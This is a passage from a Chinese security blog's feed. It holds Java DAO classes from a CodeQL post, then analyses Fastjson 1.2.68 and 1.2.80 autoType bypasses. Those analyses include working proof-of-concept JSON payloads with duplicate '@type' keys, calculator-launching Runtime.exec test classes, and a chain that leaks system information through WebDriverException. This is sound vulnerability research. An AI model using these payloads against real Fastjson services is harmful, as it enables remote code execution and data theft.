span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>joychou<span class="token punctuation">.</span>dao<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>Serializable<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DSTest</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> String username<span class="token punctuation">;</span>    <span class="token keyword">public</span> String cmd<span class="token punctuation">;</span>    <span class="token keyword">public</span> String <span class="token function">getUsername</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> username<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setUsername</span><span class="token punctuation">(</span>String username<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>username <span class="token operator">=</span> username<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> String <span class="token function">getCmd</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> cmd<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setCmd</span><span class="token punctuation">(</span>String cmd<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>cmd <span class="token operator">=</span> cmd<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>joychou<span class="token punctuation">.</span>dao<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>Serializable<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DSUser</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> String user<span class="token punctuation">;</span>    <span class="token keyword">public</span> String pass<span class="token punctuation">;</span>    <span class="token keyword">public</span> String cmd<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">DSUser</span><span class="token punctuation">(</span>String cmd<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>cmd <span class="token operator">=</span> cmd<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> String <span class="token function">getUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> user<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setUser</span><span class="token punctuation">(</span>String user<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>user <span class="token operator">=</span> user<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> String <span class="token function">getPass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> pass<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setPass</span><span class="token punctuation">(</span>String pass<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>pass <span class="token operator">=</span> pass<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> String <span class="token function">getCmd</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> cmd<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>joychou<span class="token punctuation">.</span>dao<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">QueryExample</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> String user<span class="token punctuation">;</span>    <span class="token keyword">public</span> String orderByClause<span class="token punctuation">;</span>    <span class="token keyword">public</span> String <span class="token function">getUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> user<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setUser</span><span class="token punctuation">(</span>String user<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>user <span class="token operator">=</span> user<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> String <span class="token function">getOrderByClause</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> orderByClause<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setOrderByClause</span><span class="token punctuation">(</span>String orderByClause<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>orderByClause <span class="token operator">=</span> orderByClause<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">Criteria</span> <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token function">Criteria</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> Criteria <span class="token function">createCriteria</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">createCriteriaInternal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> Criteria <span class="token function">createCriteriaInternal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Criteria</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>joychou<span class="token punctuation">.</span>dao<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">QueryRequest</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> String user<span class="token punctuation">;</span>    <span class="token keyword">public</span> String pass<span class="token punctuation">;</span>    <span class="token keyword">public</span> String cmd<span class="token punctuation">;</span>    <span class="token keyword">public</span> String sortType<span class="token punctuation">;</span>    <span class="token keyword">public</span> String <span class="token function">getUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> user<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setUser</span><span class="token punctuation">(</span>String user<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>user <span class="token operator">=</span> user<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> String <span class="token function">getPass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> pass<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setPass</span><span class="token punctuation">(</span>String pass<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>pass <span class="token operator">=</span> pass<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> String <span class="token function">getCmd</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> cmd<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setCmd</span><span class="token punctuation">(</span>String cmd<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>cmd <span class="token operator">=</span> cmd<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> String <span class="token function">getSortType</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> sortType<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setSortType</span><span class="token punctuation">(</span>String sortType<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>sortType <span class="token operator">=</span> sortType<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>joychou<span class="token punctuation">.</span>dao<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestExec</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> String <span class="token function">testExecDSUser</span><span class="token punctuation">(</span>DSUser dsUser<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        <span class="token keyword">return</span> dsUser<span class="token punctuation">.</span><span class="token function">getCmd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> String <span class="token function">testExecDSUserCmd</span><span class="token punctuation">(</span>String cmd<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        <span class="token keyword">return</span> cmd<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> String <span class="token function">testExecDSTest</span><span class="token punctuation">(</span>DSTest dsTest<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        <span class="token keyword">return</span> dsTest<span class="token punctuation">.</span><span class="token function">getCmd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> String <span class="token function">testExampleSQL</span><span class="token punctuation">(</span>QueryExample example<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"1"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CodeQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CodeQL系列之域敏感和兜底规则冲突的解决过程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java代码审计之Fastjson1.2.80反序列化漏洞</title>
      <link href="/2022/06/06/java-dai-ma-shen-ji-zhi-fastjson1.2.80-fan-xu-lie-hua-fen-xi/"/>
      <url>/2022/06/06/java-dai-ma-shen-ji-zhi-fastjson1.2.80-fan-xu-lie-hua-fen-xi/</url>
      
        <content type="html"><![CDATA[<h1 id="Java代码审计之Fastjson1-2-80反序列化漏洞"><a href="#Java代码审计之Fastjson1-2-80反序列化漏洞" class="headerlink" title="Java代码审计之Fastjson1.2.80反序列化漏洞"></a>Java代码审计之Fastjson1.2.80反序列化漏洞</h1><h2 id="0x01-漏洞寻找"><a href="#0x01-漏洞寻找" class="headerlink" title="0x01 漏洞寻找"></a>0x01 漏洞寻找</h2><p>在fastjson的github地址中，有如下的提交记录，内容是修复autoType的bug</p><p><img src="/img/Fastjson128/image-20220526172413997.png" alt="image-20220526172413997"></p><p><a href="https://github.com/alibaba/fastjson/commit/560782c9ee12120304284ba98b61dc61e30324b3" target="_blank" rel="noopener">https://github.com/alibaba/fastjson/commit/560782c9ee12120304284ba98b61dc61e30324b3</a></p><p>期望类使用了RuntimeException，而RuntimeException是继承于Throwable类</p><p><img src="/img/Fastjson128/image-20220526172548573.png" alt="image-20220526172548573"></p><p>RuntimeException继承于Exception类，Exception继承于Throwable类</p><p><img src="/img/Fastjson128/image-20220526172708794.png" alt="image-20220526172708794"></p><p><img src="/img/Fastjson128/image-20220526172748841.png" alt="image-20220526172748841"></p><h2 id="0x02-测试POC"><a href="#0x02-测试POC" class="headerlink" title="0x02 测试POC"></a>0x02 测试POC</h2><pre class="line-numbers language-JAVA"><code class="language-JAVA">// fastjson小于1.2.80版本的绕过autotype的反序列化漏洞package com.DemoFastjson.Demo1_2_80;import com.alibaba.fastjson.JSON;public class Demo1_2_80 {    public static void main(String[] args){        String text2 = "{\"@type\":\"java.lang.RuntimeException\",\"@type\":\"com.DemoFastjson.Demo1_2_80.TestException\",\"stackTrace\":[{\"@type\":\"java.lang.StackTraceElement\",\"className\":\"com.DemoFastjson.Demo1_2_80.Demo1_2_80\",\"fileName\":\"Demo1_2_80.java\",\"lineNumber\":28,\"methodName\":\"main\",\"nativeMethod\":false}]}\n";        System.out.println(text2);        Object obj2 = JSON.parse(text2);        System.out.println(obj2);    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>测试类</p><pre class="line-numbers language-JAVA"><code class="language-JAVA">package com.DemoFastjson.Demo1_2_80;import java.io.IOException;public class TestException extends RuntimeException{    static {        try {            Process proc = Runtime.getRuntime().exec("open -a Calculator");        } catch (IOException e) {            e.printStackTrace();        }    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>成功的执行了命令</p><p><img src="/img/Fastjson128/image-20220606153502556.png" alt="image-20220606153502556"></p><h2 id="0x03-漏洞原理"><a href="#0x03-漏洞原理" class="headerlink" title="0x03 漏洞原理"></a>0x03 漏洞原理</h2><p>利用链的类继承于RuntimeException类，在mapping里能够匹配到RuntimeException类，从而绕过checkAutoType进入到了ThrowableDeserializer里。</p><p><img src="/img/Fastjson128/image-20220606154550633.png" alt="image-20220606154550633"></p><h2 id="0x04-漏洞修复后对比"><a href="#0x04-漏洞修复后对比" class="headerlink" title="0x04 漏洞修复后对比"></a>0x04 漏洞修复后对比</h2><p>在fastjson-1.2.80中调试，发现进入到了ThrowableDeserializer里</p><p><img src="/img/Fastjson128/image-20220526173011616.png" alt="image-20220526173011616"></p><p>进入到了ThrowableDeserializer的checkAutoType函数里。那么期望类的值不再是空，而是Throwable</p><p><img src="/img/Fastjson128/image-20220526173138071.png" alt="image-20220526173138071"></p><p>因为期望类的标志为True，所以这里加载了需要反序列化的类</p><p><img src="/img/Fastjson128/image-20220526173315534.png" alt="image-20220526173315534"></p><p>反序列化的类加到缓存中并返回</p><p><img src="/img/Fastjson128/image-20220526173420526.png" alt="image-20220526173420526"></p><p>后面就成功的反序列化了测试类。</p><p>接下来看1.2.83中调试，同样的代码在进入到checkAutoType时，红框里的代码是新增的，这里将如果期望类继承于Throwable，就置空。</p><p><img src="/img/Fastjson128/image-20220526174718523.png" alt="image-20220526174718523"></p><p>回到1.2.80中，可以看到没有上述的判断</p><p><img src="/img/Fastjson128/image-20220526175127781.png" alt="image-20220526175127781"></p><p>因此可以判断导致此次1.2.80及以下版本反序列化的原因是Throwable导致的。</p><p>后续就是寻找利用链。</p><h2 id="0x05-非RCE的链"><a href="#0x05-非RCE的链" class="headerlink" title="0x05 非RCE的链"></a>0x05 非RCE的链</h2><pre><code>// fastjson小于1.2.80版本的绕过autotype的反序列化漏洞package com.DemoFastjson.Demo1_2_80;import com.alibaba.fastjson.JSON;public class Demo1_2_80 {    public static void main(String[] args){        String text2 = &quot;{\&quot;@type\&quot;:\&quot;java.lang.RuntimeException\&quot;,\&quot;@type\&quot;:\&quot;java.lang.Throwable\&quot;,\&quot;content\&quot;: {\&quot;$ref\&quot;:\&quot;$x.systemInformation\&quot;},\&quot;@type\&quot;:\&quot;org.openqa.selenium.WebDriverException\&quot; }&quot;;        System.out.println(text2);        Object obj2 = JSON.parse(text2);        System.out.println(obj2);    }}</code></pre><p><img src="/img/Fastjson128/image-20220606115205114.png" alt="image-20220606115205114"></p><p><code>selenium-api-3.141.59.jar!/org/openqa/selenium/WebDriverException.class</code></p><p>可以看到WebDriverException继承于RuntimeException类</p><p><img src="/img/Fastjson128/image-20220606115141203.png" alt="image-20220606115141203"></p><pre><code>public String getSystemInformation() {        return String.format(&quot;System info: host: &#39;%s&#39;, ip: &#39;%s&#39;, os.name: &#39;%s&#39;, os.arch: &#39;%s&#39;, os.version: &#39;%s&#39;, java.version: &#39;%s&#39;&quot;, HOST_NAME, HOST_ADDRESS, System.getProperty(&quot;os.name&quot;), System.getProperty(&quot;os.arch&quot;), System.getProperty(&quot;os.version&quot;), System.getProperty(&quot;java.version&quot;));    }</code></pre><p><img src="/img/Fastjson128/image-20220606115339544.png" alt="image-20220606115339544"></p><p>成功的反序列化，获取到了系统信息</p><p><img src="/img/Fastjson128/image-20220606115518976.png" alt="image-20220606115518976"></p>]]></content>
      
      
      <categories>
          
          <category> Java代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java代码审计之Fastjson1.2.80反序列化漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java代码审计之Fastjson1.2.68 AutoType绕过分析</title>
      <link href="/2022/05/25/java-dai-ma-shen-ji-zhi-fastjson1.2.68autotype-rao-guo-fen-xi/"/>
      <url>/2022/05/25/java-dai-ma-shen-ji-zhi-fastjson1.2.68autotype-rao-guo-fen-xi/</url>
      
        <content type="html"><![CDATA[<h1 id="Java代码审计之Fastjson-1-2-68-AutoType绕过分析"><a href="#Java代码审计之Fastjson-1-2-68-AutoType绕过分析" class="headerlink" title="Java代码审计之Fastjson 1.2.68 AutoType绕过分析"></a>Java代码审计之Fastjson 1.2.68 AutoType绕过分析</h1><h2 id="0x01-POC"><a href="#0x01-POC" class="headerlink" title="0x01 POC"></a>0x01 POC</h2><p>POC</p><pre><code>{&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;com.DemoFastjson.Demo1_2_68.Test1&quot;,&quot;cmd&quot;:&quot;open -a Calculator&quot;}</code></pre><p>Demo1_2_68.java</p><pre><code>package com.DemoFastjson.Demo1_2_68;import com.alibaba.fastjson.JSON;public class Demo1_2_68 {    public static void main(String[] args)    {        // 可以执行命令        // https://www.cnblogs.com/ph4nt0mer/p/13065373.html        String payload21 = &quot;{\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\&quot;@type\&quot;:\&quot;com.DemoFastjson.Demo1_2_68.Test1\&quot;,\&quot;cmd\&quot;:\&quot;open -a Calculator\&quot;}&quot;;        JSON.parse(payload21);    }}</code></pre><p>Test1.java</p><pre><code>package com.DemoFastjson.Demo1_2_68;import java.io.IOException;public class Test1 implements AutoCloseable{    public Test1(String cmd){        try {            Runtime.getRuntime().exec(cmd);        } catch (IOException e) {            e.printStackTrace();        }    }    public void close() throws Exception {    }}</code></pre><h2 id="0x02-关键知识点"><a href="#0x02-关键知识点" class="headerlink" title="0x02 关键知识点"></a>0x02 关键知识点</h2><p>各内置关键词</p><ul><li><code>acceptHashCodes</code> 白名单</li><li><code>INTERNAL_WHITELIST_HASHCODES</code> 内部白名单</li><li><code>TypeUtils.mappings</code> mappings缓存</li><li><code>deserializers.findClass</code> 指定类</li><li><code>typeMapping.get</code> 默认为空</li><li><code>JsonType</code> 注解</li><li><code>exceptClass</code> 存在期望类</li></ul><p>期望类的功能主要是实现/继承了期望类的class能被反序列化出来且不受autotype影响，默认情况下exceptClass这个参数是空的，也就不存在期望类的特性，之后全局搜索checkAutoType的调用，且条件是exceptClass不为空的有JavaBeanDeserializer、ThrowableDeserializer</p><p>例如上述的例子代码中，AutoCloseable是期望类，Test1继承了期望类，所以能够将Test1类反序列化出来。</p><p>1.2.68的绕过主要靠的就是AutoCloseable类，fastjson没有为它指定特定的deserializer，因此会走到最后的else条件，创建对应的JavaBeanDeserializer。并且它是默认在mappings缓存中的，可以无条件反序列化。</p><h2 id="0x03-分析"><a href="#0x03-分析" class="headerlink" title="0x03 分析"></a>0x03 分析</h2><p>fastjson-1.2.68-sources.jar!/com/alibaba/fastjson/parser/DefaultJSONParser.java</p><p>如果key的值为<code>@type</code>时，就会进入到<code>checkAutoType</code>函数里。因为需要<code>@type</code>反序列化指定的任意类,所以poc中肯定含有<code>@type</code>，那么就要绕过<code>checkAutoType</code>函数的检验。</p><p><img src="/img/Fastjson1268AutoType/image-20220525155515021.png" alt="image-20220525155515021"></p><p>可以看到即使AutoType关闭的情况下，也能通过<code>checkAutoType</code>函数获取到类。所以这就是为什么校验一直被绕过，主要是因为里面的逻辑被绕过。</p><p><img src="/img/Fastjson1268AutoType/image-20220525160011102.png" alt="image-20220525160011102"></p><p>com/alibaba/fastjson/parser/ParserConfig.java</p><p>那么接下来开始分析checkAutoType函数。</p><p>checkAutoType主要有三个参数</p><ul><li><code>String typeName</code> 被序列化的类名</li><li><code>Class&lt;?&gt; expectClass</code> 期望类</li><li><code>int features</code> 配置的feature值</li></ul><p><code>expectClass</code>这个期望类，它的主要目的是为了让一些实现了<code>typeName</code>这个接口的类可以被反序列化。</p><p><img src="/img/Fastjson1268AutoType/image-20220525160225534.png" alt="image-20220525160225534"></p><p>判断typeName是否为空，判断安全模式是否开启，判断typeName的长度是否过长或过短</p><p><img src="/img/Fastjson1268AutoType/image-20220525161030612.png" alt="image-20220525161030612"></p><p><code>exceptClass</code>的类型如果不为空并且不是如下类型，就设置<code>expectClassFlag</code>为<code>true</code>。这里是重点！！！这个标志符后面会用到</p><p>黑名单类型如下</p><pre><code>Object.classSerializable.classCloneable.classCloseable.classEventListener.classIterable.classCollection.class</code></pre><p><img src="/img/Fastjson1268AutoType/image-20220525161353530.png" alt="image-20220525161353530"></p><p>判断className是不是在内部白名单里，className的值是由typeName得到的。</p><p>内部白名单hash值</p><pre><code>[-9013707057526259810, -8773806119481270567, -8421588593326113468, -8070393259084821111, -7858127399773263546, -7043543676283957292, -6976602508726000783, -6293031534589903644, -6081111809668363619, -5779433778261875721, -5399450433995651784, -4540135604787511831, -4207865850564917696, -3950343444501679205, -3714900953609113456, -3393714734093696063, -3378497329992063044, -2631228350337215662, -2551988546877734201, -2473987886800209058, -2265617974881722705, -1759511109484434299, -1477946458560579955, -816725787720647462, -520183782617964618, 59775428743665658, 484499585846206473, 532945107123976213, 711449177569584898, 829148494126372070, 956883420092542580, 1233162291719202522, 1696465274354442213, 1863557081881630420, 2238472697200138595, 2380202963256720577, 2643099543618286743, 2793877891138577121, 3804572268889088203, 4567982875926242015, 4784070066737926537, 4960004821520561233, 5348524593377618456, 5454920836284873808, 5695987590363189151, 6073645722991901167, 6114875255374330593, 6137737446243999215, 6160752908990493848, 6939315124833099497, 7048426940343117278, 7267793227937552092, 8331868837379820532, 8357451534615459155, 8890227807433646566, 9166532985682478006, 9215131087512669423]</code></pre><p><img src="/img/Fastjson1268AutoType/image-20220525162305122.png" alt="image-20220525162305122"></p><p>内部黑名单hash值默认为空</p><p><img src="/img/Fastjson1268AutoType/image-20220525162514305.png" alt="image-20220525162514305"></p><p><strong>下面是核心代码</strong></p><p>如果（不在内部白名单里）并且（autoType开启 或者 预期类标志为True）时</p><p>如果在白名单中则直接加载类，如果在黑名单中则抛出异常。下面的黑名单可以过滤掉大部分的危险的链</p><p><img src="/img/Fastjson1268AutoType/image-20220525162744998.png" alt="image-20220525162744998"></p><p>黑名单类</p><pre><code>0 = -91646063882146995181 = -87200464268501004972 = -86499612137098967943 = -81656373983507076454 = -81093007016397210885 = -79661231005031995696 = -79212188309982864087 = -77753516133261013038 = -77686080374581852759 = -776660581883474809710 = -683543708615681353611 = -631615465583930462412 = -617958960955049338513 = -602514454631359021514 = -593926904854177980815 = -588596488338560599416 = -576480479206321681917 = -547209772541471710518 = -519464108126810428619 = -483753697181073797020 = -460834144694812658121 = -443877568018507410022 = -408205704023512575423 = -397537847882505378324 = -393518585487573336225 = -331920794948669102026 = -307720561301007720327 = -282537836217315029228 = -243993009889557815429 = -237899070401064114830 = -236498799424767911531 = -226224476061995208132 = -219280439701934731333 = -209551657138885261034 = -187241701536658811735 = -165048581498302715836 = -158919488021423512937 = -90517702636675253638 = -83178904573428346639 = -58281322852033798840 = -25467011137624715141 = -19028106568539568042 = -2663903586773312443 = -982248306788249144 = 475033605857430945 = 3323834420774534246 = 21851299294753631247 = 31386410020789750748 = 38646143623470183149 = 82364106647360995050 = 107363473930828977651 = 115329163770104374852 = 120323272796730860653 = 145986084593481762454 = 150284595887395915255 = 153443961056744575456 = 169850444131751581857 = 181808930849337039458 = 207811338242133496759 = 216469672306928785460 = 265345362992977056961 = 266067062386618097762 = 273182343946773750663 = 283643125473789111364 = 308945146010152785765 = 311486286811760559966 = 325625836824806626467 = 354762778165459898868 = 363793965644044109369 = 368817907272210920070 = 371835266112413668171 = 373075243228582686372 = 379431666576326603373 = 404619036152067164374 = 414769670714727140875 = 425458435024733443376 = 481465843357017591377 = 484194770985091291478 = 490400781718863045779 = 510033608151008034380 = 527404485814153826581 = 534790987763365482882 = 545044882833492148583 = 547426816595905464084 = 559612985613557369785 = 568820088375179838986 = 575139343950279529587 = 594410796923615558088 = 600733260659287673789 = 628035796095921766090 = 645685572347419690891 = 651103557606325427092 = 653494646824050708993 = 673424032643409624694 = 674270543271801178095 = 685485481608105352396 = 712332689729450706097 = 717933692836588946598 = 737586238699662373199 = 7442624256860549330100 = 7658177784286215602101 = 8055461369741094911102 = 8389032537095247355103 = 8409640769019589119104 = 8488266005336625107105 = 8537233257283452655106 = 8838294710098435315107 = 9140390920032557669108 = 9140416208800006522</code></pre><p>尝试从各处获取class类,如果是内部白名单，则直接加载类</p><p><img src="/img/Fastjson1268AutoType/image-20220525165323133.png" alt="image-20220525165323133"></p><p><code>TypeUtils</code>的<code>mappings</code></p><p><img src="/img/Fastjson1268AutoType/image-20220525165159074.png" alt="image-20220525165159074"></p><p>缓存mappings里的类</p><pre><code>&quot;java.lang.IndexOutOfBoundsException&quot; -&gt; {Class@709} &quot;class java.lang.IndexOutOfBoundsException&quot;&quot;java.lang.Integer&quot; -&gt; {Class@258} &quot;class java.lang.Integer&quot;&quot;java.lang.NoSuchFieldException&quot; -&gt; {Class@718} &quot;class java.lang.NoSuchFieldException&quot;&quot;java.lang.Long&quot; -&gt; {Class@257} &quot;class java.lang.Long&quot;&quot;java.math.BigInteger&quot; -&gt; {Class@567} &quot;class java.math.BigInteger&quot;&quot;java.lang.LinkageError&quot; -&gt; {Class@311} &quot;class java.lang.LinkageError&quot;&quot;java.lang.StringIndexOutOfBoundsException&quot; -&gt; {Class@696} &quot;class java.lang.StringIndexOutOfBoundsException&quot;&quot;java.lang.StackOverflowError&quot; -&gt; {Class@306} &quot;class java.lang.StackOverflowError&quot;&quot;long&quot; -&gt; {Class@857} 